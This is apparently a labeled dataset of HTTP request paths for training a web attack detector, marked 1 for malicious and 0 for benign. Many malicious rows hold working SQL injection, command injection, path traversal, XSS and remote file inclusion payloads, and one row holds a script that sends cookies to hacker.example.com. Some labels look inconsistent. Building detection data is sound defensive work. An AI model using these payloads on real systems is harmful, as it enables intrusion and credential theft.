request	label
/ string / strings / parameters = data : text / html ; charset = utf-7 ; base64 , ij48l3rpdgxlpjxzy3jpchq + ywxlcnqomtmznyk8l3njcmlwdd4 = 	1
/ string / strings / parameters = order by 7 -- 	1
/ string / strings / parameters = requena 	0
/ string / strings / parameters = 1 '  or char ( 119 )  |  | char ( 100 )  |  | char ( 99 )  |  | char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 )  , 0 )  , 5000000000 )  , null )  -- 	1
/ string / modo = entrar & login = bobbie7 +  & pwd = 8r126ec2o & remember = on & b1 = entrar 	1
/ football league review 8th may 2005 352x288 xvid english / 	0
/ 1252162834 / 	0
/ 314367647475 / 	0
/ string / strings / parameters = ; echo ukkxoy $  (  ( 15 + 70 )  )  $  ( echo ukkxoy ) ukkxoy 	1
/ javascript / 15 . trace 	0
/ techblast / 	0
/ javascript / surf . error 	0
"/ moodle / filter / tex / texed . php ? formdata = foo & pathname = foo ""  +  |  |  + echo + rcx >  > esbq "	1
/ files / login . php3 ? err = hack & bsx_htxdir = http :  /  / 192 . 168 . 202 . 118 : 8080 / zz5thkvtmlgl ? 	0
/ string / strings / parameters = 1 %  '  )  )  )  and  ( select 2 *  ( if (  ( select  *  from  ( select concat ( 0x7171706a71 ,  ( select  ( elt ( 3484 = 3484 , 1 )  )  )  , 0x717a767a71 , 0x78 )  ) s )  ,  8446744073709551610 ,  8446744073709551610 )  )  )  and  (  (  (  '  %  '  =  ' 	1
/ examples / jsp / checkbox / source ? v =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
/ cgi-bin / more . php ? id = 1 ' 	1
/ protection . php ? logout_page = xxpathxx ? 	1
"/ moodle / filter / tex / texed . php ? formdata = foo & pathname = foo ""  +  |  |  + echo + db + d0 + 8b + 04 + 91 + 01 + f0 + 89 + 45 + f0 + eb + 06 + 43 + 3b + 5d + f4 + 72 + d4 + 89 + ec + 61 + 8b + 44 + 24 + d0 + c2 +  +  >  > ctdn "	1
"/ gvx7m5ti . aspx ?  < script > document . cookie =  "" testwldz = 3506 ;  ""  <  / script > "	1
"/ qczkquis . html ?  < script > document . cookie =  "" testkwlg = 5591 ;  ""  <  / script > "	1
/ javascript / feature . jsp 	0
"/ main . php ? stuff =  ""  & rm \ xa0q28776765 & rem \ xa0 "	1
/ javascript / secured . temp 	0
/ string / strings / parameters = od89 	0
/ string / strings / parameters = mendie 	0
/ javascript / contacts . trace 	0
/ string / strings / parameters = '  , null , null , null , null , null , null , null , null )  waitfor delay  ' 0 : 0 : 20 '   -- 	1
/ string / strings / parameters = 1 '  |  |  ( select  ' jpso '  from dual where 9357 = 9357 or  ( select 2 *  ( if (  ( select  *  from  ( select concat ( 0x7171706a71 ,  ( select  ( elt ( 8113 = 8113 , 1 )  )  )  , 0x717a767a71 , 0x78 )  ) s )  ,  8446744073709551610 ,  8446744073709551610 )  )  )  )  |  |  ' 	1
"/ scripts / wordtrans . php ? command = show_desc & advanced = 1 ""  ; id ;  true  "" "	1
/ 144116 / 	0
"/ string / strings / parameters = -9535 ""  ""  order by 1 -- "	1
/ javascript / dba . exe 	1
/ 156553 / 	0
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo gikitn )   &  &  str1 =  $  {  # str }   &  &   [  6 -eq  $  { str1 }   ]   &  &  sleep 1  /  / 	1
/ string / strings / parameters = ; id 	1
/ solindexg / 	0
/ 247291 / 	0
/ string / strings / parameters = 7636792275869092 	0
"/ string / strings / parameters = ""  |  | echo zxhqbt $  (  ( 34 + 29 )  )  $  ( echo zxhqbt ) zxhqbt "	1
/ string / strings / parameters = 1 '  )  )  as hqhs where 5383 = 5383 ; select  ( case when  ( 8978 = 1426 )  then 1 else 8978 *  ( select 8978 from master .  . sysdatabases )  end )  -- 	1
/ daytona / 	0
"/ string / strings / parameters = ""  |  | echo $ ifskqelnd $  (  ( 18 + 15 )  )  $  ( echo $ ifskqelnd ) kqelnd /  / "	1
/ zipped / 	0
/ javascript / wtai . log 	0
/ examples / jsp / cal / popup . php ? include_path =  / etc / passwd \ x00 	1
/ chritsmaswishandrew / 	0
"/ string / strings / parameters = ""  ""  ; alert ( 1 )  /  / "	1
/ string / strings / parameters = piwkowsk 	0
/ bn857frh . do ?  < script > cross_site_scripting . nasl <  / script > 	1
/ pperl3 / 	0
/ string / strings / parameters = murueta 	0
/ javascript / wc . c 	0
"/ string / strings / parameters = ;  str =  $  ( echo rppevg )  ;  str1 =  $  {  # str }  ;  if  [  2 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  "" "	1
/ veniceby / 	0
/ fid371001ad5e954ae58bd3bca6f181505f7b4a60ed / 	0
/ string / modo = registro & login = bejar & password = litigar & nombre = enzo & apellidos = capell + latre & email = borgato @ 19horas . ee & dnia = 96483882d & direccion = esperanto ,  + 182 ,  +  & ciudad = sobremunt & cp = 19278 & provincia = alicante & ntc = 2319237634289833 & b1 = registrar 	1
/ string / modo = insertar & precio = 4189 & b1 = pasar + por + caja 	0
/ tn_1390 / 	0
/ 10770586 / 	0
/ string / strings / parameters = 1 where 2823 = 2823 and 3707 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  -- 	1
/ main . php ? logout =  '  \ x0duname  # 	1
"/ string / strings / parameters = 1 ""  ""  )  )  as aamh where 7432 = 7432  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 )  , 0 )  , 500000000 )  , null )  else char ( 108 )  |  | char ( 76 )  |  | char ( 112 )  |  | char ( 116 )  end )  from information_schema . system_users )  -- "	1
/ string / modo = registro & login = fernando & password = arruga4 & nombre = alfi & apellidos = abaeto + sanchon & email = cortland @ tobarisch . bs & dni = 67615328c & direccion = ronda + ambeles + 62 + 8-d & ciudad = santa + maria + de + merls & cp = 18126 & provincia = barcelona & ntc = 5326624144210576 & b1 = registrar 	0
/ string / strings / parameters = galileo ,  76 ,  6-a 	0
/ string / strings / parameters = -6254 %  '  )  )  )  or 1 group by concat ( 0x7171706a71 ,  ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  )  having min ( 0 )  # 	1
/ clrc150 / 	0
"/ jnv890lt . exe ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ bio_laats / 	0
/ javascript / dialog . jar 	0
/ 027khz / 	0
/ recordings / comments . php ? sort_by = phpwebgallery_sort_by_sql_injection . nasl 	0
/ pnadodb / server . php ? do = undefined_special_function & sql = generate_sql_error 	0
/ news_html / 	0
/ string / modo = entrar & login = sauprobo & pwd = d75a4r45der & remember = off & b1 = entrar 	0
/ string / modo = insertar & precio = 2969 & b1 = pasar + por + caja 	0
/ sethusc / 	0
/ 042711 / 	0
/ string / strings / parameters = | echo sbzvba $  (  ( 97 + 74 )  )  $  ( echo sbzvba ) sbzvba /  / 	1
"/ 7o5qp766 . do ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ index . php ? x = browse & category =  ' union select  ' 1 '  ,  ' 2 '  ,  ' pixelpost_category_sql_injection . nasl '  ,  ' 1331904240 '  ,  ' 5 '  -- 	1
/ test_30 / 	0
/ string / strings / parameters = enparantza concordia 4 	0
/ phplib / version / 1 . 3 . 3 / module / surfer_anmeldung_nwl . php ? tt_docroot = xxpathxx 	1
/ box_bottom01 / 	0
/ string / strings / parameters = 1 %  '  )  )  union all select null , null , null -- 	1
/ southwest-ireland / 	0
/ addressresolutionprotocol / 	0
"/ help . php ? q =  ""  & del ; q69128354 & rem ; "	1
/ string / modo = registro & login = wun & password = intercesoriamente & nombre = betty & apellidos = tejo & email = katcher @ tabernarinconete . nr & dni = 45295566x & direccion = c /  + errementariena + 31 ,  +  & ciudad = tordmar & cp = 25471 & provincia = burgos & ntc = 6590914640490551 & b1 = registrar 	0
/ left-sponsors / 	0
/ 111818 / 	0
/ shoppingcart / 	0
/ 29bizchoice / 	0
/ mail . php ? id =  '  /  *  *  / union /  *  *  / select /  *  *  / 1 , 2 , 1331904244 , 4 --  & blog = 1 	1
/ w060126motionle1600tablet / 	0
"/ string / strings / parameters = ""  &  sleep 0  &  &  str =  $  ( echo clrjxd )   &  &  str1 =  $  {  # str }   &  &   [  2 -eq  $  { str1 }   ]   &  &  sleep 1  \  \ "	1
"/ examples / jsp / num / server . pt ? open = space & name =  ""  ;  }  <  / script >  < script > alert (  ' plumtree_name_xss . nasl '  )  <  / script > "	1
/ check43426previous / 	0
/ string / modo = registro & login = meier & password = c6nte9osa & nombre = nimia & apellidos = buisn + andres & email = oliveira_aptekman @ engibraltar . va & dni = 00660335m & direccion = inocencia + alayon ,  + s / n + 4-f & ciudad = san + bartolom + de + la + torre & cp = 12510 & provincia = valladolid & ntc = 3227728964471059 & b1 = registrar 	0
/ cgi-bin / starnet / modules / sn_allbum / slideshow . php ? cmsdir =  / etc / passwd \ x00 	1
/ bemarket / postscript / postscript . php ? p_mode = http :  /  / 192 . 168 . 202 . 118 : 8080 / 2aibfaczmac8 ? 	1
/ 200_warne1 / 	0
/ string / modo = entrar & login = lescot & pwd = jengibre & remember = off & b1 = entrar 	0
/ 000032359 / 	0
/ javascript / toc . exe 	1
"/ eei78ore . cfc ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ 2002juldec / 	0
"/ vmi8bb12 . kspx ?  < meta http-equiv = set-cookie content =  "" testlerc = 2575 ""  > "	1
/ 179904 / 	0
/ note . txt ? f_notini =  & t_note =  & nomentreprise = blah & filenote =  .  .  /  .  .  / winnt / win . ini 	1
/ sprout / 	0
/ 1591840783 / 	0
/ im_monitoring / 	0
/ blade_4 / 	0
/ elvis presley - 30 golden hits / 	0
"/ string / strings / parameters = ""  `  '  >  < script >  \ x0ajavascript : alert ( 1 )  <  / script > "	1
"/ string / strings / parameters = -6809 ""  ""  )  )  or 5903 =  (  ' qqpjq '  |  |  ( select case 5903 when 5903 then 1 else 0 end from rdb $ database )  |  |  ' qzvzq '  )  and  (  (  ""  "" nfnf ""  ""  =  ""  "" nfnf "	1
/ string / strings / parameters = dannies 	0
/ main . php ? logout =  '  ; del \ x09q79392194 \ x09 # 	1
/ computatores / 	0
/ string / str =  $  ( echo rcspmw )   str1 =  $  {  # str }   if  [  1 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  /  / 	1
/ 0684800713 / 	0
/ 20shake / 	0
/ searchrightcap20050513 / 	0
/ main . php ? stuff =  \ x0auname \ x09 > q55874964 \ x09 # 	1
/ examples / jsp / sessions / index . php ? id =  ' union /  *  *  / select /  *  *  / 0 , 0 , 1705245003 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 -- 	1
/ aa070899 / 	0
/ mon_0201 / 	0
/ emifile1376 / 	0
/ string / strings / parameters = 1 %  '  )  )  ; call regexp_substring ( repeat ( right ( char ( 3702 )  , 0 )  , 500000000 )  , null )  and  (  (  '  %  '  =  ' 	1
"/ string / strings / parameters = ""  &  sleep 0  &  &  str =  $  ( echo gfpzmf )   &  &  str1 =  $  {  # str }   &  &   [  1 -eq  $  { str1 }   ]   &  &  sleep 1  /  / "	1
"/ help . php ? q =  ""  & ping -w 7000 -n 1 1 . 2 . 3 . 4 & rem "	1
/ dda2qr7j . jspa ?  < script > cross_site_scripting . nasl <  / script > 	1
/ gcb-tm / 	0
/ string / modo = registro & login = ervin & password = nodal & nombre = agustn & apellidos = artigas + girut & email = mattos @ velazquezlarraaga . dd & dni = 55912738z & direccion = c /  + torcuato + perez ,  + 69 ,  +  & ciudad = candelario & cp = 41960 & provincia = len & ntc = 7208264078394889 & b1 = registrar 	0
/ openssl_button / 	0
/ b3_home / 	0
/ p043snfr . cfc ?  < script > cross_site_scripting . nasl <  / script > 	1
"/ string / strings / parameters = < img id = xss src =  ` javascript : alert (  ""  ""  ' xss '  ""  ""  )  `  > "	1
/ string / strings / parameters = 1 '  )  )  )  and 3715 in  (  ( char ( 113 )  + char ( 113 )  + char ( 112 )  + char ( 106 )  + char ( 113 )  +  ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end )  )  + char ( 113 )  + char ( 122 )  + char ( 118 )  + char ( 122 )  + char ( 113 )  )  )  and  (  (  (  ' njge '  like  ' njge 	1
/ index . php ? pagina = http :  /  / 192 . 168 . 202 . 118 : 8080 / moclyxlwqyfjnp ?  ? 	0
/ edv3mapy . mscgi ?  < script > cross_site_scripting . nasl <  / script > 	1
/ 40_hudson2 / 	0
/ string / strings / parameters = 4092441841924319 	0
"/ string / strings / parameters = < div id =  "" 66 ""  >  <  ? xml version =  "" 1 . 0 ""  ?  > "	1
/ bzuf9ozq . php3 ?  < script > cross_site_scripting . nasl <  / script > 	1
/ examples / jsp / num / check_user_id . php ? user_id =  < script > foo <  / script > 	1
/ 15129599 / 	0
/ admin / login . aspx 	0
"/ string / strings / parameters = < div id = d >  < x xmlns =  ""  >  < iframe onload = javascript : alert ( 1 )  ""  >  <  / div >   < script > d . innerhtml = d . innerhtml <  / script > "	1
/ e9rx3ya4 . pl ?  < script > cross_site_scripting . nasl <  / script > 	1
/ 042872 / 	0
/ string / modo = insertar |  & precio = 9823 & b1 = confirmar 	1
/ string / modo = registro & login = weihs & password = tesalnico & nombre = edelia & apellidos = sau & email = dailey @ flabingo . gw & dni = 02879028a & direccion = passatge + riu + ebre + 32 ,  +  & ciudad = guingueta + d ' neu ,  + la & cp = 16360 & provincia = jan & ntc = 0892478865637376 & b1 = registrar 	0
/ unsel_international / 	0
/ string / strings / parameters = desortija0a 	0
/ scripts / index . php ? op = viewarticle & articleid = 9999 /  *  *  / union /  *  *  / select /  *  *  / 1332009306 , 1 , 1 , 1 , 1 , 1 , 1 , 1 --  & blogid = 1 	1
/ ms_voip / 	0
/ string / strings / parameters = 1 '  )  as sjij where 8659 = 8659 ; call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  -- 	1
/ 88-10658 / 	0
/ string / strings / parameters = chilln 	0
/ string / strings / parameters = marcos esculta 	0
/ genrelist / 	0
/ help . php ? q = ver ,  > q87514478 & rem , 	1
/ recordings / c99shell . php 	0
/ string / strings / parameters = $  { proc_open ( print (  ` echo bufrzn `  .  ` echo  $  (  ( 99 + 37 )  )  `  .  ` echo bufrzn `  .  ` echo bufrzn `  )  ;  \  \ bufrzn 	1
/ module / forum / forum . php ? fd = http :  /  / 192 . 168 . 202 . 118 : 8080 / moclyxlwqyfjnp ?  =  '  ; 	1
"/ string / strings / parameters = ""  | echo uprlnq $  (  ( 23 + 4 )  )  $  ( echo uprlnq ) uprlnq "" "	1
/ ppphonedenied / 	0
/ scripts / index . php ? module = topics & func = view & topicid = -1 union select null , null ,  ' mdpro_topicid_sql_injection . nasl-1331918993 '  , null , null , null , null  -- 	1
/ jeremeyshoemakershoemoneyhatbait / 	0
/ string / modo = registro & login = waltdisn & password = ac4inia & nombre = yasmila & apellidos = monerris + brau & email = dearden @ hipermadrid . ga & dni = 83203700g & direccion = c /  + flors ,  + 115 +  & ciudad = navas + de + orosessionid = 12312312 &  + username =  < script > document . location =  ' http :  /  / hacker +  . example . com / cgi-bin / cookiesteal . cgi ?  '  +  + document . cookie <  / script >  & cp = 32782 & provincia = zaragoza & ntc = 0851365114838541 & b1 = registrar 	1
/ hackguid / 	0
/ cgi-home / windmail . exe 	1
/ string / strings / parameters = berenice 	0
/ javascript / text-base . stackdump 	0
/ javascript / ingress . pl 	0
/ 119001 / 	0
/ string / modo = registro & login = mcmurray & password = e6749l178e3a & nombre = idefonsa & apellidos = belito + cedeo & email = mallet . asanachinda @ placeresadultos . cf & dni = 30216787p & direccion = plaa + del + pi + 126 + 11 ? g & ciudad = atazar ,  + el & cp = 40320 & provincia = lleida & ntc = 9084625508674249 & b1 = registrar 	0
/ string / strings / parameters = 55235483v 	0
/ string / strings / parameters = 20115 	0
/ javascript / multimedia . old 	0
/ 000118725 / 	0
/ string / strings / parameters = tarsila 	0
/ string / modo = entrar & login = o . neil & pwd = 6a0ato & remember = off & b1 = entrar 	0
/ javascript / fonts . vbs 	0
/ string / strings / parameters = cachapera 	0
/ string / modo = registro & login = junmeng & password = in8ros742tiva & nombre = juventino & apellidos = vaquer + gorigoitia & email = kuravlev @ minimizar . ve & dni = 97531792q & direccion = calle + llansa ,  + s / n ,  + 1a & ciudad = cadrete & cp = 10739 & provincia = castelln & ntc = 0851327510236186 & b1 = registrar 	0
/ string / strings / parameters = '  | echo lpcjms $  (  ( 42 + 26 )  )  $  ( echo lpcjms ) lpcjms 	1
/ phpimageview . php ? pic = javascript : alert ( 8754 ) 	1
/ string / id = 3 & nombre = queso + manchego & precio = 39 & cantidad = 32 & b1 = aadir + al + carrito 	0
/ index261 / 	0
/ string / modo = entrar & login = spight & pwd = aj1quecars0 & remember = on /  & b1 = entrar 	1
/ scripts / admin . php ? dpt = conf & sub = general 	1
"/ vjbrrppi . php3 ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
"/ x7pclv4s . php ?  < meta http-equiv = set-cookie content =  "" testiulz = 3709 ""  > "	1
/ javascript / seed . shtml 	0
/ string / modo = entrar & login = bittman & pwd = camueso & remember = off & b1 = entrar 	0
/ string / strings / parameters = maeya 	0
/ ie4-otag / 	0
"/ yver8r9o . aspx ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ examples / jsp / cal / starnet / addons / slideshow_full . php ? album_name =  ' 1554634339 	1
"/ string / strings / parameters = ""  ""  ; alert (  ' xss '  )  ;  /  / "	1
/ pcp_download / 	0
/ main . php ? logout =  '  \ x0adel \ x09q29624474 \ x09 # 	1
"/ xsqln7eb . aspx ?  < meta http-equiv = set-cookie content =  "" testpcbb = 9254 ""  > "	1
/ string / id = any ?   set-cookie :  + tamper = 1041264011025374727 	1
/ onlinepersona / 	0
/ string / modo = any  set-cookie :  + tamper = 5765205567234876235 & precio = 5059 & b1 = confirmar 	1
/ string / modo = registro & login = lippens27 & password = nacer & nombre = fedro & apellidos = hidrobo & email = cecil . wolcott7 @ librodeapuntes . sv & dni = 41992996x & direccion = avinguda + gabriel + alomar + i + villalonga ,  + 20 + 6 ? a & ciudad = hortezuela + de + ocn & cp = 37159 & provincia = len & ntc = 4485457754707106 & b1 = registrar 	0
/ javascript / procure . key 	0
/ string / strings / parameters = glandgera 	0
/ javascript / zorum . test 	0
/ string / modo = entrar & login = mast + en , br & pwd = 7t3c484 & remember = on & b1 = entrar 	1
"/ dslpwt15 . cgi ?  < script > document . cookie =  "" testtkio = 5454 ;  ""  <  / script > "	1
/ nonsecurity / 	0
/ introentrustpki_wp / 	0
/ feature_raid / 	0
/ appserver . exe / 	1
"/  ?  < meta http-equiv = set-cookie content =  "" testnago = 4518 ""  > "	1
/ mortalkombatdeception / 	0
/ javascript / jvm . asp 	0
/ string / strings / parameters = echo $ ifsjmctgn $  (  ( 61 + 39 )  )  $  ( echo $ ifsjmctgn ) jmctgn \ 	1
/ string / strings / parameters = calle fausto fraile 0 	0
/ string / strings / parameters = ohenry . ridofi2 @ e-b-s . gr 	0
/ string / strings / parameters = & apos ;  ;  alert ( 1 )  ;  /  / 	1
/ string / strings / parameters = |   [  9 -ne  $  ( echo cxwpxj  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  \  \ 	1
/ string / strings / parameters = cryoelec 	0
